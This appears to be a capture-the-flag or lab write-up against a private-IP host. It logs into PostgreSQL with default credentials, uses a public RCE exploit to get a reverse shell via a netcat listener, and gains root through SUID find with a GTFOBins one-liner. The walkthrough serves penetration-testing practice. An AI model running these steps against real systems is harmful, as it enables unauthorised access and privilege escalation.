IP: 192.168.236.47



# Scanned all TCP ports:

**Open TCP ports discovered:**
- 21/tcp  vsftpd 3.0.3 (FTP)
- 22/tcp  OpenSSH 7.9p1 (SSH)
- 80/tcp  Apache httpd 2.4.38 (HTTP)
- 5437/tcp PostgreSQL DB 11.3–11.7
- others closed or filtered

---

# Enumeration

## PostgreSQL (port 5437)
- Default Postgres credentials found online.
- Connect with `psql`:
  ```bash
  psql -h 192.168.236.47 -p 5437 -U postgres -W
  # password: postgres
  ```
- Confirmed PostgreSQL version **11.7**.

---

# Exploitation

## PostgreSQL Remote Code Execution
- Retrieved a public RCE exploit script for PostgreSQL 11.7.
- Modified the script with attacker IP and port.
- Ran the script and started a Netcat listener on port 80:
  ```bash
  nc -lvnp 80
  ```
- Executed exploit → **reverse shell** as `postgres` user.

---

# Privilege Escalation

## Local Enumeration
- Enumerated SUID binaries:
  ```bash
  find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
  ```
- Noted `/usr/bin/find` is SUID root.

## SUID `find` Exploit
- Consulted GTFOBins for `find`:
  ```bash
  find . -exec /bin/sh -p \; -quit
  ```
- Ran the above command in a writable directory → **root shell** obtained.

